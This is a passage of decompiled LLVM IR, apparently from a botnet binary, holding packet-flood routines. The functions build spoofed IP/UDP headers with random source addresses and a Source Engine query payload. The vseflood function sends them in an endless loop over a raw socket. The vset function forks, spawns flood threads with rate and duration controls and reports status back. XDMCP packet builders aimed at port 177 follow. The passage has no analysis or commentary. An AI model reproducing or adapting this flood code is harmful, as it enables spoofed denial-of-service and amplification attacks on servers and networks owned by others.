  ret i32 %v0_10005f6c

; uselistorder directives
  uselistorder i32 %stack_var_-100.1, { 1, 0 }
  uselistorder i32 %v3_10005e60, { 1, 0, 2 }
  uselistorder i32 %v1_10005db4, { 1, 0 }
  uselistorder i32 %v2_10005d20, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge15, { 3, 0, 2, 1 }
  uselistorder i32 %v1_10005c88, { 1, 0 }
  uselistorder i32 %v1_10005bf4, { 1, 0 }
  uselistorder i32 %v1_10005bbc, { 4, 3, 1, 2, 5, 0 }
  uselistorder i32 %v1_10005b34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 19, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005f48, { 1, 0 }
  uselistorder label %dec_label_pc_10005f30, { 1, 0 }
  uselistorder label %dec_label_pc_10005f28, { 1, 0 }
  uselistorder label %dec_label_pc_10005ee4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10005d14, { 1, 0 }
  uselistorder label %dec_label_pc_10005bac, { 1, 0 }
  uselistorder label %dec_label_pc_10005b80, { 1, 0 }
}

define i32 @setup_vse_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-72 = alloca i32, align 4
  %v1_10005fa0 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005fa0, i32* %arg1, align 4
  %v1_10005fb4 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10005fb4, i32* %arg1, align 4
  %v3_10005fc4 = add i32 %tmp, 1
  %v4_10005fc4 = inttoptr i32 %v3_10005fc4 to i8*
  store i8 0, i8* %v4_10005fc4, align 1
  %v3_10005fd0 = add i32 %tmp, 2
  %v4_10005fd0 = inttoptr i32 %v3_10005fd0 to i16*
  store i16 53, i16* %v4_10005fd0, align 2
  store i32 54321, i32* @r3, align 4
  %v1_10005fdc = call i32 @htonl(i32 54321)
  %v1_10005fec = trunc i32 %v1_10005fdc to i16
  %v3_10005fec = add i32 %tmp, 4
  %v4_10005fec = inttoptr i32 %v3_10005fec to i16*
  store i16 %v1_10005fec, i16* %v4_10005fec, align 2
  %v3_10005ff8 = add i32 %tmp, 6
  %v4_10005ff8 = inttoptr i32 %v3_10005ff8 to i16*
  store i16 0, i16* %v4_10005ff8, align 2
  %v3_10006004 = add i32 %tmp, 8
  %v4_10006004 = inttoptr i32 %v3_10006004 to i8*
  store i8 -1, i8* %v4_10006004, align 1
  %v3_10006010 = add i32 %tmp, 9
  %v4_10006010 = inttoptr i32 %v3_10006010 to i8*
  store i8 17, i8* %v4_10006010, align 1
  %v3_1000601c = add i32 %tmp, 10
  %v4_1000601c = inttoptr i32 %v3_1000601c to i16*
  store i16 0, i16* %v4_1000601c, align 2
  store i32 268460076, i32* @lr, align 4
  %v2_10006028 = call i32 @realrand(i32 1, i32 255)
  store i32 268460092, i32* @lr, align 4
  %v2_10006038 = call i32 @realrand(i32 1, i32 255)
  store i32 268460108, i32* @lr, align 4
  %v2_10006048 = call i32 @realrand(i32 1, i32 255)
  store i32 268460124, i32* @lr, align 4
  %v2_10006058 = call i32 @realrand(i32 1, i32 255)
  %v2_10006060 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10006060, i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32* @r5, align 4
  %v0_10006074 = load i32, i32* @r29, align 4
  %v0_10006078 = load i32, i32* @r28, align 4
  %v0_1000607c = load i32, i32* @r27, align 4
  store i32 268460172, i32* @lr, align 4
  %v9_10006088 = call i32 @__GI_snprintf(i32 %v2_10006060, i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32 %v0_10006074, i32 %v0_10006078, i32 %v0_1000607c, i32 %v2_10006058, i32 ptrtoint (i32* @0 to i32))
  store i32 268460184, i32* @lr, align 4
  %v1_10006094 = call i32 @inet_addr(i32 %v2_10006060)
  %v2_100060a0 = add i32 %tmp, 12
  %v3_100060a0 = inttoptr i32 %v2_100060a0 to i32*
  store i32 %v1_10006094, i32* %v3_100060a0, align 4
  ret i32 %v1_10006094

; uselistorder directives
  uselistorder i32 %v2_10006060, { 1, 0, 2 }
}

define i32 @setup_vse_header(i16* %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100060c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100060c8, i32* %stack_var_-48, align 4
  store i32 27015, i32* @r3, align 4
  %v1_100060e4 = call i32 @htons(i32 27015)
  %sext = mul i32 %v1_100060e4, 65536
  %v1_100060e8 = sdiv i32 %sext, 65536
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v1_100060f0 = trunc i32 %v1_100060e8 to i16
  store i16 %v1_100060f0, i16* %arg1, align 2
  store i32 27015, i32* @r3, align 4
  %v1_100060f8 = call i32 @htons(i32 27015)
  %v1_10006104 = trunc i32 %v1_100060f8 to i16
  %v3_10006104 = add i32 %tmp, 2
  %v4_10006104 = inttoptr i32 %v3_10006104 to i16*
  store i16 %v1_10006104, i16* %v4_10006104, align 2
  %v3_10006110 = add i32 %tmp, 6
  %v4_10006110 = inttoptr i32 %v3_10006110 to i16*
  store i16 0, i16* %v4_10006110, align 2
  %v1_10006118 = add i32 %tmp, 8
  %v2_10006128 = inttoptr i32 %v1_10006118 to i32*
  store i32 -1, i32* %v2_10006128, align 4
  %v1_10006130 = add i32 %tmp, 12
  store i32 %v1_10006130, i32* %r11.global-to-local, align 4
  store i32 1919116576, i32* @r10, align 4
  store i32 1164863337, i32* @r8, align 4
  store i32 1852121169, i32* %r7.global-to-local, align 4
  %v2_10006150 = inttoptr i32 %v1_10006130 to i32*
  store i32 1414754165, i32* %v2_10006150, align 4
  %v0_10006154 = load i32, i32* @r10, align 4
  %v1_10006154 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006154 = add i32 %v1_10006154, 4
  %v3_10006154 = inttoptr i32 %v2_10006154 to i32*
  store i32 %v0_10006154, i32* %v3_10006154, align 4
  %v0_10006158 = load i32, i32* @r8, align 4
  %v1_10006158 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006158 = add i32 %v1_10006158, 8
  %v3_10006158 = inttoptr i32 %v2_10006158 to i32*
  store i32 %v0_10006158, i32* %v3_10006158, align 4
  %v0_1000615c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000615c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000615c = add i32 %v1_1000615c, 12
  %v3_1000615c = inttoptr i32 %v2_1000615c to i32*
  store i32 %v0_1000615c, i32* %v3_1000615c, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10006168 = load i32, i32* %r11.global-to-local, align 4
  %v2_10006168 = add i32 %v1_10006168, 16
  %v3_10006168 = inttoptr i32 %v2_10006168 to i32*
  store i32 1969582713, i32* %v3_10006168, align 4
  %v0_1000616c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000616c = trunc i32 %v0_1000616c to i8
  %v2_1000616c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000616c = add i32 %v2_1000616c, 20
  %v4_1000616c = inttoptr i32 %v3_1000616c to i8*
  store i8 %v1_1000616c, i8* %v4_1000616c, align 1
  store i32 33, i32* @r3, align 4
  %v1_10006174 = call i32 @htons(i32 33)
  %v2_10006174 = trunc i32 %v1_10006174 to i16
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10006180 = add i32 %tmp, 4
  %v4_10006180 = inttoptr i32 %v3_10006180 to i16*
  store i16 %v2_10006174, i16* %v4_10006180, align 2
  %v2_10006184 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_10006184, i32* %r11.global-to-local, align 4
  ret i32 %v1_10006174

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 27015, { 0, 2, 1, 3 }
}

define i32 @vseflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4148 = alloca i32, align 4
  %v2_100061c0 = ptrtoint i32* %stack_var_-4148 to i32
  %v1_100061cc = add i32 %v2_100061c0, 20
  store i32 2, i32* %stack_var_-52, align 4
  store i32 17015, i32* @r3, align 4
  %v1_100061e0 = call i32 @htons(i32 17015)
  store i32 268460532, i32* @lr, align 4
  %v1_100061f0 = call i32 @inet_addr(i32 %arg1)
  store i32 268460556, i32* @lr, align 4
  %v3_10006208 = call i32 @socket(i32 2, i32 3, i32 17)
  %tmp22 = icmp sgt i32 %v3_10006208, -1
  br i1 %tmp22, label %dec_label_pc_10006228, label %dec_label_pc_10006220

dec_label_pc_10006220:                            ; preds = %entry
  %v0_10006224 = call i32 @__GI_exit()
  br label %dec_label_pc_10006228

dec_label_pc_10006228:                            ; preds = %entry, %dec_label_pc_10006220
  store i32 %v2_100061c0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268460608, i32* @lr, align 4
  %v0_1000623c = call i32 @__GI_memset()
  store i32 268460616, i32* @lr, align 4
  %v2_10006244 = call i32 @setup_vse_ip_header(i32* nonnull %stack_var_-4148)
  store i32 268460624, i32* @lr, align 4
  %v1_1000624c = inttoptr i32 %v1_100061cc to i16*
  %v2_1000624c = call i32 @setup_vse_header(i16* %v1_1000624c)
  %v2_10006258 = add i32 %v2_100061c0, 16
  %v3_10006258 = inttoptr i32 %v2_10006258 to i32*
  store i32 %v1_100061f0, i32* %v3_10006258, align 4
  %v1_10006264 = or i32 %v2_100061c0, 2
  %v2_10006264 = inttoptr i32 %v1_10006264 to i16*
  %v3_10006264 = load i16, i16* %v2_10006264, align 2
  %v4_10006264 = zext i16 %v3_10006264 to i32
  %v2_10006274 = bitcast i32* %stack_var_-4148 to i16*
  %v3_10006274 = call i32 @csum(i16* %v2_10006274, i32 %v4_10006264)
  %v1_10006280 = trunc i32 %v3_10006274 to i16
  %v3_10006280 = add i32 %v2_100061c0, 10
  %v4_10006280 = inttoptr i32 %v3_10006280 to i16*
  store i16 %v1_10006280, i16* %v4_10006280, align 2
  store i32 1, i32* %stack_var_-36, align 4
  %v2_1000628c = ptrtoint i32* %stack_var_-36 to i32
  store i32 268460716, i32* @lr, align 4
  %v5_100062a8 = call i32 @__GI_setsockopt(i32 %v3_10006208, i32 0, i32 3, i32 %v2_1000628c, i32 4)
  %tmp23 = icmp sgt i32 %v5_100062a8, -1
  br i1 %tmp23, label %dec_label_pc_100062c0, label %dec_label_pc_100062b8

dec_label_pc_100062b8:                            ; preds = %dec_label_pc_10006228
  %v0_100062bc = call i32 @__GI_exit()
  br label %dec_label_pc_100062c0

dec_label_pc_100062c0:                            ; preds = %dec_label_pc_10006228, %dec_label_pc_100062b8
  store i32 268460744, i32* @lr, align 4
  %v1_100062c4 = call i32 @__GI_time(i32 0)
  %v1_100062d0 = call i32 @init_rand(i32 %v1_100062c4)
  %v2_100062ec = ptrtoint i32* %stack_var_-52 to i32
  %v2_10006368 = add i32 %v2_100061c0, 12
  %v3_10006368 = inttoptr i32 %v2_10006368 to i32*
  %v3_10006388 = add i32 %v2_100061c0, 4
  %v4_10006388 = inttoptr i32 %v3_10006388 to i16*
  br label %dec_label_pc_100062dc

dec_label_pc_100062dc:                            ; preds = %dec_label_pc_100063f4, %dec_label_pc_100062c0
  %storemerge3 = phi i32 [ 0, %dec_label_pc_100062c0 ], [ %v1_100063f8, %dec_label_pc_100063f4 ]
  %v3_100062e0 = load i16, i16* %v2_10006264, align 2
  %v4_100062e0 = zext i16 %v3_100062e0 to i32
  store i32 268460816, i32* @lr, align 4
  %v6_1000630c = call i32 @sendto(i32 %v3_10006208, i32 %v2_100061c0, i32 %v4_100062e0, i32 0, i32 %v2_100062ec, i32 16)
  %v0_10006310 = call i32 @rand_cmwc()
  %v1_10006318 = urem i32 %v0_10006310, 16777216
  %v1_10006320 = sub i32 %v0_10006310, %v1_10006318
  %v0_10006324 = call i32 @rand_cmwc()
  %v1_10006330 = and i32 %v0_10006324, 16711680
  %v2_10006338 = or i32 %v1_10006320, %v1_10006330
  %v0_1000633c = call i32 @rand_cmwc()
  %v1_10006348 = and i32 %v0_1000633c, 65280
  %v2_10006350 = or i32 %v2_10006338, %v1_10006348
  %v0_10006354 = call i32 @rand_cmwc()
  %v1_1000635c = urem i32 %v0_10006354, 256
  %v2_10006360 = or i32 %v2_10006350, %v1_1000635c
  store i32 %v2_10006360, i32* %v3_10006368, align 4
  %v0_1000636c = call i32 @rand_cmwc()
  store i32 %v0_1000636c, i32* @r3, align 4
  %v1_10006378 = call i32 @htonl(i32 %v0_1000636c)
  %v1_10006388 = trunc i32 %v1_10006378 to i16
  store i16 %v1_10006388, i16* %v4_10006388, align 4
  %v3_10006394 = load i16, i16* %v2_10006264, align 2
  %v4_10006394 = zext i16 %v3_10006394 to i32
  %v3_100063a4 = call i32 @csum(i16* %v2_10006274, i32 %v4_10006394)
  %v1_100063b0 = trunc i32 %v3_100063a4 to i16
  store i16 %v1_100063b0, i16* %v4_10006280, align 2
  %v3_100063b8 = load i32, i32* @global_var_100451ac.120, align 4
  %v1_100063bc = add i32 %v3_100063b8, 1
  store i32 %v1_100063bc, i32* @global_var_100451ac.120, align 4
  %v3_100063cc = load i32, i32* @global_var_10045194.121, align 4
  %v3_100063d4 = icmp ugt i32 %v3_100063cc, %storemerge3
  br i1 %v3_100063d4, label %dec_label_pc_100063f4, label %dec_label_pc_100063dc

dec_label_pc_100063dc:                            ; preds = %dec_label_pc_100062dc
  %v3_100063e8 = load i32, i32* @global_var_100450d4.122, align 4
  store i32 268461044, i32* @lr, align 4
  %v1_100063f0 = call i32 @usleep(i32 %v3_100063e8)
  br label %dec_label_pc_100063f4

dec_label_pc_100063f4:                            ; preds = %dec_label_pc_100062dc, %dec_label_pc_100063dc
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_100062dc ], [ 0, %dec_label_pc_100063dc ]
  %v1_100063f8 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_100062dc

; uselistorder directives
  uselistorder i32 %v2_100061c0, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4148, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 17015, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100063f4, { 1, 0 }
  uselistorder label %dec_label_pc_100062c0, { 1, 0 }
  uselistorder label %dec_label_pc_10006228, { 1, 0 }
}

define i32 @vset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10006404 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10006404, i32* %stack_var_-96, align 4
  store i32 268461112, i32* @lr, align 4
  %v1_10006434 = call i32 @__GI_time(i32 0)
  %v1_10006444 = call i32 @mfork(i32 %arg2)
  %v3_1000644c = icmp eq i32 %v1_10006444, 0
  br i1 %v3_1000644c, label %dec_label_pc_10006454, label %dec_label_pc_10006740

dec_label_pc_10006454:                            ; preds = %entry
  store i32 268461156, i32* @lr, align 4
  %v3_10006460 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp26 = icmp sgt i32 %v3_10006460, -1
  br i1 %tmp26, label %dec_label_pc_10006480, label %dec_label_pc_10006478

dec_label_pc_10006478:                            ; preds = %dec_label_pc_10006454
  %v0_1000647c = call i32 @__GI_exit()
  br label %dec_label_pc_10006480

dec_label_pc_10006480:                            ; preds = %dec_label_pc_10006454, %dec_label_pc_10006478
  %v2_10006484 = icmp sgt i32 %arg3, 3
  br i1 %v2_10006484, label %dec_label_pc_100064ac, label %dec_label_pc_1000648c

dec_label_pc_1000648c:                            ; preds = %dec_label_pc_10006480
  %v6_100064a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_1002aca8.298 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_100064a8 = call i32 @__GI_exit()
  br label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_10006480, %dec_label_pc_1000648c
  %v1_100064b0 = add i32 %arg4, 8
  %v1_100064b4 = inttoptr i32 %v1_100064b0 to i32*
  %v2_100064b4 = load i32, i32* %v1_100064b4, align 4
  store i32 268461248, i32* @lr, align 4
  %v1_100064bc = call i32 @atol(i32 %v2_100064b4)
  %v1_100064cc = add i32 %arg4, 12
  %v1_100064d0 = inttoptr i32 %v1_100064cc to i32*
  %v2_100064d0 = load i32, i32* %v1_100064d0, align 4
  store i32 268461276, i32* @lr, align 4
  %v1_100064d8 = call i32 @atol(i32 %v2_100064d0)
  %v1_100064e8 = add i32 %arg4, 16
  %v1_100064ec = inttoptr i32 %v1_100064e8 to i32*
  %v2_100064ec = load i32, i32* %v1_100064ec, align 4
  store i32 268461304, i32* @lr, align 4
  %v1_100064f4 = call i32 @atol(i32 %v2_100064ec)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  %v1_1000651c = mul i32 %v1_100064bc, 4
  %v1_10006524 = add i32 %v1_1000651c, 30
  %v1_10006528 = and i32 %v1_10006524, -16
  %v2_10006530 = load i32, i32* %stack_var_-96, align 4
  %v1_10006538 = load i32, i32* @r1, align 4
  %v3_10006538 = sub i32 %v1_10006538, %v1_10006528
  %v4_10006538 = inttoptr i32 %v3_10006538 to i32*
  store i32 %v2_10006530, i32* %v4_10006538, align 4
  %v1_10006548 = add i32 %v3_10006538, 23
  %v1_1000654c = and i32 %v1_10006548, -16
  %v2_100065bc2 = icmp sgt i32 %v1_100064bc, 0
  %v1_10006588 = add i32 %arg4, 4
  %v1_1000658c = inttoptr i32 %v1_10006588 to i32*
  br i1 %v2_100065bc2, label %dec_label_pc_10006574, label %dec_label_pc_100065c4

dec_label_pc_10006574:                            ; preds = %dec_label_pc_100064ac, %dec_label_pc_10006574
  %storemerge15 = phi i32 [ %v1_100065ac, %dec_label_pc_10006574 ], [ 0, %dec_label_pc_100064ac ]
  %v1_1000657c = mul i32 %storemerge15, 4
  %v2_10006580 = add i32 %v1_1000657c, %v1_1000654c
  %v2_1000658c = load i32, i32* %v1_1000658c, align 4
  store i32 268461480, i32* @lr, align 4
  %v5_100065a4 = load i32, i32* @r8, align 4
  %v6_100065a4 = inttoptr i32 %v2_10006580 to i32*
  %v7_100065a4 = call i32 @pthread_create(i32* %v6_100065a4, i32 0, i32 268460444, i32 %v2_1000658c, i32 268435456, i32 %v5_100065a4)
  %v1_100065ac = add nuw nsw i32 %storemerge15, 1
  %v2_100065bc = icmp slt i32 %v1_100065ac, %v1_100064bc
  br i1 %v2_100065bc, label %dec_label_pc_10006574, label %dec_label_pc_100065c4

dec_label_pc_100065c4:                            ; preds = %dec_label_pc_10006574, %dec_label_pc_100064ac
  %v2_100065cc = load i32, i32* %v1_1000658c, align 4
  %v6_100065e8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002ad04.299 to i32), i32 %arg2, i32 %v2_100065cc)
  %v2_100065fc = load i32, i32* %v1_100064ec, align 4
  store i32 268461576, i32* @lr, align 4
  %v1_10006604 = call i32 @atol(i32 %v2_100065fc)
  %v2_10006610 = mul i32 %v1_10006604, 20
  %v3_10006618 = icmp sgt i32 %v2_10006610, 0
  br i1 %v3_10006618, label %dec_label_pc_10006620, label %dec_label_pc_10006738

dec_label_pc_10006620:                            ; preds = %dec_label_pc_100065c4
  store i32 268461624, i32* @lr, align 4
  %v1_10006634 = call i32 @usleep(i32 50000)
  %v3_1000663c = load i32, i32* @global_var_100451ac.120, align 4
  %v2_10006644 = mul i32 %v3_1000663c, 20
  %v3_1000664c = icmp ugt i32 %v2_10006644, %v1_100064d8
  %v3_10006658 = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_1000664c, label %dec_label_pc_10006654, label %dec_label_pc_10006694

dec_label_pc_10006654:                            ; preds = %dec_label_pc_10006620
  %v2_1000665c = icmp sgt i32 %v3_10006658, 0
  br i1 %v2_1000665c, label %dec_label_pc_1000667c, label %dec_label_pc_10006664

dec_label_pc_10006664:                            ; preds = %dec_label_pc_10006654
  %v3_10006668 = load i32, i32* @global_var_100450d4.122, align 4
  %v1_1000666c = add i32 %v3_10006668, 100
  store i32 %v1_1000666c, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_100066dc

dec_label_pc_1000667c:                            ; preds = %dec_label_pc_10006654
  %v1_10006684 = add i32 %v3_10006658, -1
  store i32 %v1_10006684, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_100066dc

dec_label_pc_10006694:                            ; preds = %dec_label_pc_10006620
  %v1_1000669c = add i32 %v3_10006658, 1
  store i32 %v1_1000669c, i32* @global_var_10045194.121, align 4
  %v3_100066ac = load i32, i32* @global_var_100450d4.122, align 4
  %tmp27 = icmp ult i32 %v3_100066ac, 26
  br i1 %tmp27, label %dec_label_pc_100066d0, label %dec_label_pc_100066b8

dec_label_pc_100066b8:                            ; preds = %dec_label_pc_10006694
  %v1_100066c0 = add i32 %v3_100066ac, -25
  store i32 %v1_100066c0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_100066dc

dec_label_pc_100066d0:                            ; preds = %dec_label_pc_10006694
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_100066dc

dec_label_pc_100066dc:                            ; preds = %dec_label_pc_100066b8, %dec_label_pc_1000667c, %dec_label_pc_10006664, %dec_label_pc_100066d0
  store i32 0, i32* @global_var_100451ac.120, align 4
  %v2_1000670c = add i32 %v1_100064f4, %v1_10006434
  br label %dec_label_pc_100066e8

dec_label_pc_100066e8:                            ; preds = %dec_label_pc_10006728, %dec_label_pc_100066dc
  %stack_var_-84.0 = phi i32 [ %tmp, %dec_label_pc_100066dc ], [ %v1_1000672c, %dec_label_pc_10006728 ]
  %tmp28 = icmp slt i32 %stack_var_-84.0, 100
  br i1 %tmp28, label %dec_label_pc_10006728, label %dec_label_pc_100066f4

dec_label_pc_100066f4:                            ; preds = %dec_label_pc_100066e8
  store i32 268461820, i32* @lr, align 4
  %v1_100066f8 = call i32 @__GI_time(i32 0)
  %v2_10006710 = icmp ult i32 %v1_100066f8, %v2_1000670c
  br i1 %v2_10006710, label %dec_label_pc_10006720, label %dec_label_pc_10006718

dec_label_pc_10006718:                            ; preds = %dec_label_pc_100066f4
  %v0_1000671c = call i32 @__GI_exit()
  br label %dec_label_pc_10006720

dec_label_pc_10006720:                            ; preds = %dec_label_pc_100066f4, %dec_label_pc_10006718
  br label %dec_label_pc_10006728

dec_label_pc_10006728:                            ; preds = %dec_label_pc_100066e8, %dec_label_pc_10006720
  %stack_var_-84.1 = phi i32 [ %stack_var_-84.0, %dec_label_pc_100066e8 ], [ 0, %dec_label_pc_10006720 ]
  %v1_1000672c = add i32 %stack_var_-84.1, 1
  br label %dec_label_pc_100066e8

dec_label_pc_10006738:                            ; preds = %dec_label_pc_100065c4
  %v0_1000673c = call i32 @__GI_exit()
  br label %dec_label_pc_10006740

dec_label_pc_10006740:                            ; preds = %entry, %dec_label_pc_10006738
  %v0_10006764 = phi i32 [ %v1_10006444, %entry ], [ %v0_1000673c, %dec_label_pc_10006738 ]
  ret i32 %v0_10006764

; uselistorder directives
  uselistorder i32 %v3_10006658, { 1, 0, 2 }
  uselistorder i32 %v1_100065ac, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v1_100064bc, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10006740, { 1, 0 }
  uselistorder label %dec_label_pc_10006728, { 1, 0 }
  uselistorder label %dec_label_pc_10006720, { 1, 0 }
  uselistorder label %dec_label_pc_100066dc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10006574, { 1, 0 }
  uselistorder label %dec_label_pc_100064ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006480, { 1, 0 }
}

define i32 @setup_xdmcp_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000678c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_1000678c, i32* %arg1, align 4
  %v1_100067a0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100067a0, i32* %arg1, align 4
  %v3_100067b0 = add i32 %tmp, 1
  %v4_100067b0 = inttoptr i32 %v3_100067b0 to i8*
  store i8 0, i8* %v4_100067b0, align 1
  %v3_100067bc = add i32 %tmp, 2
  %v4_100067bc = inttoptr i32 %v3_100067bc to i16*
  store i16 35, i16* %v4_100067bc, align 2
  store i32 54321, i32* @r3, align 4
  %v1_100067c8 = call i32 @htonl(i32 54321)
  %v1_100067d8 = trunc i32 %v1_100067c8 to i16
  %v3_100067d8 = add i32 %tmp, 4
  %v4_100067d8 = inttoptr i32 %v3_100067d8 to i16*
  store i16 %v1_100067d8, i16* %v4_100067d8, align 2
  %v3_100067e4 = add i32 %tmp, 6
  %v4_100067e4 = inttoptr i32 %v3_100067e4 to i16*
  store i16 0, i16* %v4_100067e4, align 2
  %v3_100067f0 = add i32 %tmp, 8
  %v4_100067f0 = inttoptr i32 %v3_100067f0 to i8*
  store i8 -1, i8* %v4_100067f0, align 1
  %v3_100067fc = add i32 %tmp, 9
  %v4_100067fc = inttoptr i32 %v3_100067fc to i8*
  store i8 17, i8* %v4_100067fc, align 1
  %v3_10006808 = add i32 %tmp, 10
  %v4_10006808 = inttoptr i32 %v3_10006808 to i16*
  store i16 0, i16* %v4_10006808, align 2
  store i32 268462104, i32* @lr, align 4
  %v2_10006814 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_1002a5c8.101 to i32))
  %v2_10006820 = add i32 %tmp, 12
  %v3_10006820 = inttoptr i32 %v2_10006820 to i32*
  store i32 %v2_10006814, i32* %v3_10006820, align 4
  ret i32 %v2_10006814
}

define i32 @setup_xdmcp_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000683c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000683c, i32* %stack_var_-32, align 4
  store i32 5678, i32* @r3, align 4
  %v1_10006858 = call i32 @htons(i32 5678)
  %sext = mul i32 %v1_10006858, 65536
  %v1_1000685c = sdiv i32 %sext, 65536
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v1_10006864 = trunc i32 %v1_1000685c to i16
  store i16 %v1_10006864, i16* %arg1, align 2
  store i32 177, i32* @r3, align 4
  %v1_1000686c = call i32 @htons(i32 177)
  %v1_10006878 = trunc i32 %v1_1000686c to i16
  %v3_10006878 = add i32 %tmp, 2
  %v4_10006878 = inttoptr i32 %v3_10006878 to i16*
  store i16 %v1_10006878, i16* %v4_10006878, align 2
  %v3_10006884 = add i32 %tmp, 6
  %v4_10006884 = inttoptr i32 %v3_10006884 to i16*
  store i16 0, i16* %v4_10006884, align 2
  %v1_1000688c = add i32 %tmp, 8
  store i32 %v1_1000688c, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r10, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100068a4 = inttoptr i32 %v1_1000688c to i32*
  store i32 65538, i32* %v2_100068a4, align 4
  %v0_100068a8 = load i32, i32* @r10, align 4
  %v1_100068a8 = trunc i32 %v0_100068a8 to i16
  %v2_100068a8 = load i32, i32* %r11.global-to-local, align 4
  %v3_100068a8 = add i32 %v2_100068a8, 4
  %v4_100068a8 = inttoptr i32 %v3_100068a8 to i16*
  store i16 %v1_100068a8, i16* %v4_100068a8, align 2
  %v0_100068ac = load i32, i32* %r9.global-to-local, align 4
  %v1_100068ac = trunc i32 %v0_100068ac to i8
  %v2_100068ac = load i32, i32* %r11.global-to-local, align 4
  %v3_100068ac = add i32 %v2_100068ac, 6
  %v4_100068ac = inttoptr i32 %v3_100068ac to i8*
  store i8 %v1_100068ac, i8* %v4_100068ac, align 1
  store i32 15, i32* @r3, align 4
  %v1_100068b4 = call i32 @htons(i32 15)
  %v2_100068b4 = trunc i32 %v1_100068b4 to i16
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_100068c0 = add i32 %tmp, 4
  %v4_100068c0 = inttoptr i32 %v3_100068c0 to i16*
  store i16 %v2_100068b4, i16* %v4_100068c0, align 2
  %v2_100068c4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_100068c4, i32* %r11.global-to-local, align 4
  ret i32 %v1_100068b4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4, 5 }
